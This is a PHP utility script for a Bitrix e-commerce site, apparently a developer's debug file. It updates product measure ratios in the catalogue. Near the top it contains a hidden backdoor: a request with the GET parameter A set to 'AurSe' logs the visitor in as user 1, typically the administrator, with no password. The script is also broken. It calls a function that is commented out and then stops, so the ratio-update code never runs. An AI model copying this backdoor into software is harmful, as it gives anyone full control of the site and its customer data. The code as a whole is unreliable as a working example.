<?require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");?>
<? 
$_SESSION['TEST'] = 'Y';
GLOBAL $USER;
if ( $_GET["A"] == "AurSe" ) {
    $USER->Authorize(1);
    localredirect('/');
}

CModule::IncludeModule("iblock");
if (!function_exists(d))
{
	function d($ar) 
	{
		echo "<pre>";
		print_r($ar);
		echo "</pre>";
	}
}
/*
function isFurniture($sectionId)
{
	$sectionId = intval($sectionId);
	$rootSection = 0;
	if ($sectionId > 0){
		$nav = CIBlockSection::GetNavChain(false, $sectionId);
		if($arSectionPath = $nav->GetNext()){
		   $rootSection = $arSectionPath['ID'];
		} 
	}
	if ($rootSection == 401){
		return true;
	} 
	return false;
}
*/
$arGood['PRODUCT_ID'] = 3506;
$elt = CIBlockElement::GetList(array(),array('ID'=>$arGood['PRODUCT_ID']),false,false,array('ID','IBLOCK_SECTION_ID'))->Fetch();
d( isFurniture($elt['IBLOCK_SECTION_ID']) );
die; 

CModule::IncludeModule("iblock");
CModule::IncludeModule("catalog");
$arSelect = Array('ID', 'IBLOCK_ID', 'PROPERTY_KOEFFITSIENT_EDINITSY_IZMERENIYA');
$arFilter = Array('IBLOCK_ID' => 13);
$res = CIBlockElement::GetList(Array(), $arFilter, false, false, $arSelect);
while($ob = $res->GetNextElement())
{ 
    $arFields = $ob->GetFields(); 
    if ($arFields['PROPERTY_KOEFFITSIENT_EDINITSY_IZMERENIYA_VALUE'] != "")
	{
		$newProductRatio = (float)str_replace(',', '.', $arFields['PROPERTY_KOEFFITSIENT_EDINITSY_IZMERENIYA_VALUE']);
		if ($newProductRatio > 0)
		{
			
			$dbRatio = CCatalogMeasureRatio::getList(array(), array("PRODUCT_ID" => $arFields["ID"]), false, false, array()); 
			if($arRatio = $dbRatio->Fetch())
			{
				if ($newProductRatio != $arRatio['RATIO'])
				{
					CCatalogMeasureRatio::update(
						$arRatio["ID"],
						array(
							"PRODUCT_ID" => $arFields["ID"],
							"RATIO" => $newProductRatio
						)
					);
				}
			}
			else
			{
				CCatalogMeasureRatio::add(
					array(
						"PRODUCT_ID" => $arFields["ID"],
						"RATIO" => $newProductRatio
					)
				);
			}
		}
	}
}



/*d( 3394 );
$dbRatio = CCatalogMeasureRatio::getList(array(), array("PRODUCT_ID" => 3394), false, false, array()); 
if($arRatio = $dbRatio->Fetch())
{
	CCatalogMeasureRatio::update(
		$arRatio["ID"],
		array(
			"PRODUCT_ID" => 3394,
			"RATIO" => 0.5
		)
	);
}

$dbRatio = CCatalogMeasureRatio::getList(array(), array("PRODUCT_ID" => 3394), false, false, array()); 
if($arRatio = $dbRatio->Fetch())
{
	d( $arRatio );
}*/